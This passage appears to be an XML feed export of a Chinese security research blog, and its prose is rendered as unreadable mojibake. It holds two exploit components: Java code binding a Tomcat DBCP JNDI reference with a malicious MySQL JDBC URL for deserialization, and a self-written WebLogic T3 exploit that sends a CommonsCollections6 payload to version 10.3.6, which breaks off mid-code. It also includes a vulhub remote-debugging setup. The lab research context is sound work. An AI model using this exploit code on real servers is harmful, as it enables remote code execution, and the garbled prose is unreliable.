srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126214509825"></p><p>è°ƒç”¨äº†createDataSource</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214524364.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214524364.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126214524364"></p><p>createDataSourceæ–¹æ³•,InitialSize &gt; 0æ—¶ä¼šè°ƒç”¨getLogWriter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126211800091.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126211800091.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126211800091"></p><p>è·Ÿè¿›åˆ°getLogWriterï¼Œè¿™æ˜¯ä¸ªæ•°æ®åº“çš„æ—¥å¿—è®°å½•å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126213316784.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126213316784.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126213316784"></p><p>ç»§ç»­è·Ÿåˆ°BasicDataSource.createDatasourceï¼ŒcreatePollableConnectionFactoryè¿æ¥æ•°æ®åº“å·¥å‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142500301.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142500301.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241201142500301"></p><p>createPoolableConnectionFactoryæ„é€ å‡½æ•°è°ƒç”¨åˆ°validateConnectionFactoryï¼Œç„¶åè°ƒç”¨äº†makeObject</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142627267.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142627267.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241201142627267"></p><p>åœ¨makeObjectè°ƒç”¨createConnection</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142742993.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142742993.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241201142742993"></p><p>createConnectionå¯¹æˆ‘ä»¬ä¼ å…¥çš„JDBCä¸²è¿›è¡Œconnectï¼Œä¸‹é¢å°±æ˜¯æ ¹æ®ä¸åŒçš„JDBCä¸²è¿›è¡Œconnectçš„æµç¨‹äº†ï¼Œæ¯”å¦‚è¿™é‡Œç”¨çš„Mysqlï¼Œå°±ä¼šè¿›åˆ°<code>com.mysql.cj.jdbc</code>connectçš„æµç¨‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142846039.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142846039.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241201142846039"></p><p>payloadçš„JDBCä¸²éœ€è¦æ ¹æ®ç›®æ ‡æœºç°æœ‰çš„æ•°æ®åº“ä¾èµ–è¿›è¡Œé€‰æ‹©ï¼Œå¦‚æœç›®æ ‡æœºæœ‰H2+JDK11å°±èƒ½æ‰“RUNSCRIPTä¹‹ç±»çš„ï¼Œè¿™é‡Œå‡è®¾ç›®æ ‡ç”¨çš„MySQL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">tomcat_dbcp2_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">tomcat_dbcp1_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">commons_dbcp2_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;org.apache.commons.dbcp2.BasicDataSourceFactory&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">commons_dbcp1_RCE</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;org.apache.commons.dbcp.BasicDataSourceFactory&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">    Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">factory</span> <span class="operator">=</span> tomcat_dbcp2_RCE();</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, factory, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">JDBC_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;<span class="comment">//æ ¹æ®æ•°æ®åº“ä¾èµ–ä¿®æ”¹JDBCä¸²</span></span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>,<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>,JDBC_URL));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;root&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;password&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>,<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    context.bind(<span class="string">&quot;remoteImpl&quot;</span>, ref);<span class="comment">//åˆ›å»ºhttp:ç›®å½•ï¼Œç„¶ååˆ›å»º127.0.0.1:8888ç›®å½•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬åœ°èµ·æ¶æ„MySQL Server + JNDI Server</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/%E9%AB%98%E7%89%88%E6%9C%ACJNDI%20JDBC%20MySQL%E7%BB%95%E8%BF%87.gif" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/%E9%AB%98%E7%89%88%E6%9C%ACJNDI%20JDBC%20MySQL%E7%BB%95%E8%BF%87.gif" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="é«˜ç‰ˆæœ¬JNDI JDBC MySQLç»•è¿‡"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201143717691.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201143717691.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241201143717691"></p><p>â€”â€”su18</p><p>å‚è€ƒï¼š</p><p>ã€ŠMake JDBC Attacks Brilliant Againã€‹è®®é¢˜</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p><a href="https://p4d0rn.gitbook.io/java/jdbc-attack/h2">https://p4d0rn.gitbook.io/java/jdbc-attack/h2</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> otheræ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDBC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA +dockerè¿œç¨‹è°ƒè¯•weblogic</title>
      <link href="/2024/11/25/idea-docker-yuan-cheng-diao-shi/"/>
      <url>/2024/11/25/idea-docker-yuan-cheng-diao-shi/</url>
      
        <content type="html"><![CDATA[<p>æŠ„ä¸€ä¸ªIDEA dockerçš„è¿œç¨‹è°ƒè¯•ï¼Œå¤ç°weblogicè¢«æ•´çš„å¤§è„‘åç˜«</p><h2 id="vulhubç‰ˆç¯å¢ƒæ­å»º"><a href="#vulhubç‰ˆç¯å¢ƒæ­å»º" class="headerlink" title="vulhubç‰ˆç¯å¢ƒæ­å»º"></a>vulhubç‰ˆç¯å¢ƒæ­å»º</h2><p><a href="https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2017-10271">https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2017-10271</a></p><p>é¦–å…ˆå°†dockerçš„8453å¼€å¯</p><p>ä¿®æ”¹docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œdocker-compose up -d ä¸‹è½½å’Œè¿è¡Œé•œåƒã€‚</p><p>ä¸‹è½½å®Œæˆå</p><p>ä½¿ç”¨<code>docker exec -it weblogic /bin/bash</code> è¿›å…¥å®¹å™¨ï¼Œä¿®æ”¹<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code></p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031174834776-898289365.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031174834776-898289365.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031174834776-898289365.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><p> æ·»åŠ ä¸¤è¡Œä»£ç </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugFlag=<span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="built_in">export</span> debugFlag </span><br></pre></td></tr></table></figure><p>ç„¶å<code>docker restart å®¹å™¨id</code></p><p>å› ä¸ºéœ€è¦weblogicçš„æºç ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ weblogicçš„æºç å’ŒjdkåŒ…éƒ½æ‹·è´å‡ºæ¥ã€‚</p><p><code>docker cp weblogic:/root ./weblogic_jars</code></p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175023249-413470801.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175023249-413470801.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175023249-413470801.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><p>ç„¶åideaæ‰“å¼€<code>/root/Oracle/Middleware/wlserver_10.3/</code>ç›®å½•</p><p>å¦‚å›¾</p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175129518-1227494194.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175129518-1227494194.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175129518-1227494194.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><p>ç„¶åä½¿ç”¨å‘½ä»¤æŠŠMiddlewareç›®å½•ä¸‹æ‰€æœ‰çš„*.jaråŒ…éƒ½æ”¾åœ¨ä¸€ä¸ªtestçš„æ–‡ä»¶å¤¹é‡Œã€‚</p><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p><p><code>find ./ -name *.jar -exec cp &#123;&#125; ./test/ \;</code></p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175246338-402360036.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175246338-402360036.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175246338-402360036.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><p>ç„¶ååœ¨librariesä¸‹æ·»åŠ testç›®å½•</p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175324633-1279780349.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175324633-1279780349.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175324633-1279780349.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><p>åœ¨jdkè¿™å—é€‰ç”¨weblogic10.3.6è‡ªå¸¦çš„jdk6</p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175401969-1626244476.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175401969-1626244476.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175401969-1626244476.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><p> éƒ½å¢åŠ ä»¥å</p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175418941-438835508.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175418941-438835508.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175418941-438835508.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><p>è¿™å—å°±ä¼šå‡ºç°ä¸¤ä¸ªç›®å½•ã€‚</p><p>ç„¶åæˆ‘ä»¬æ·»åŠ è¿œç¨‹æœåŠ¡å™¨ã€‚</p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175459102-1115823273.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175459102-1115823273.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175459102-1115823273.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><p> ç«¯å£å·æ˜¯8453</p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175516574-482328806.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175516574-482328806.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175516574-482328806.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><p> ç„¶ååº”ç”¨ï¼Œå¼€å¯debug</p><p>å½“consoleå‡ºç°ä¸‹é¢å›¾ç‰‡æ—¶å€™ï¼Œè¯´æ˜å¯ä»¥äº†ã€‚</p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175606211-1788033283.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175606211-1788033283.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175606211-1788033283.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><p>ç„¶ååœ¨<code>/wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class</code>çš„129è¡Œä¸‹æ–­ç‚¹</p><p><em><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175732510-274443972.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175732510-274443972.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175732510-274443972.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></em></p><p>burpåœ¨wls-wsatè¿›è¡Œå‘åŒ…</p><p>å½“å‡ºç°ä¸‹å›¾æ—¶ï¼Œè¯´æ˜æˆåŠŸäº†ã€‚</p><p><a href="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175806877-931381151.png"><img src="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175806877-931381151.png" class="lazyload placeholder" data-srcset="https://img2018.cnblogs.com/blog/650236/201910/650236-20191031175806877-931381151.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="img"></a></p><h2 id="QAX-A-Teamç‰ˆç¯å¢ƒæ­å»º"><a href="#QAX-A-Teamç‰ˆç¯å¢ƒæ­å»º" class="headerlink" title="QAX-A-Teamç‰ˆç¯å¢ƒæ­å»º"></a>QAX-A-Teamç‰ˆç¯å¢ƒæ­å»º</h2><p>æŒ‰ç…§å¦‚ä¸‹æ–‡æ¡£æ­å»ºå¥½weblogic å¹¶è¿è¡Œdockerå</p><p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><p>ç›´æ¥æŠŠweblogicå®‰è£…åŒ…é‚£ä¸ªjarçš„modulesæåˆ°IDEAåº“ä¸‹é¢</p><p>ç„¶åé…ç½®é‡Œè¿œç¨‹è°ƒè¯•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125225835517.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241125225835517.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241125225835517"></p><p>è‡ªå·±å†™äº†ä¸ªæ‰“weblogic 10.3.6çš„CC6</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.Weblogic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebLogicExploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to generate payload using ysoserial</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] generatePayload() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;cc6.ser&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶</span></span><br><span class="line">            payload = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> payload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to send the exploit payload over T3 protocol</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">T3Exploit</span><span class="params">(String ip, <span class="type">int</span> port, <span class="type">byte</span>[] payload)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(ip, port);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Send T3 handshake</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">handshake</span> <span class="operator">=</span> <span class="string">&quot;t3 10.3.6\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>;</span><br><span class="line">        outputStream.write(handshake.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Read response from the server</span></span><br><span class="line">        <span class="type">byte</span>[] response = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> inputStream.read(response);</span><br><span class="line">        <span class="type">String</span> <span class="variable">responseData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(response, <span class="number">0</span>, len, StandardCharsets.UTF_8);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if it&#x27;s WebLogic server</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;HELO&quot;</span>);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(responseData);</span><br><span class="line">        <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;WebLogic&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Not WebLogic&quot;</span>);</span><br><span class="line">            socket.close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Construct the full payload with headers and exploit data</span></span><br><span class="line">        <span class="type">byte</span>[] header = hexStringToByteArray(<span class="string">&quot;00000000&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] t3Header = hexStringToByteArray(<span class="string">&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] desFlag = hexStringToByteArray(<span class="string">&quot;fe010000&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        byteArrayOutputStream.write(header);</span><br><span class="line">        byteArrayOutputStream.write(t3Header);</span><br><span class="line">        byteArrayOutputStream.write(desFlag);</span><br><span class="line">        byteArrayOutputStream.write(payload);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] fullPayload = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set the length in the correct place</span></span><br><span class="line">        <span class="type">byte</span>[] lengthPrefix = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            lengthPrefix[i] = (<span class="type">byte</span>) ((fullPayload.length &gt;&gt; (<span class="number">8</span> * (<span class="number">3</span> - i))) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Send the payload</span></span><br><span class="line">        outputStream.write(lengthPrefix);</span><br><span class="line">        outputStream.write(fullPayload, <span class="number">4</span>, fullPayload.length - <span class="number">4</span>);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        </span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Helper function to convert hex string to byte array</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] hexStringToByteArray(String s) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[len / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i += <span 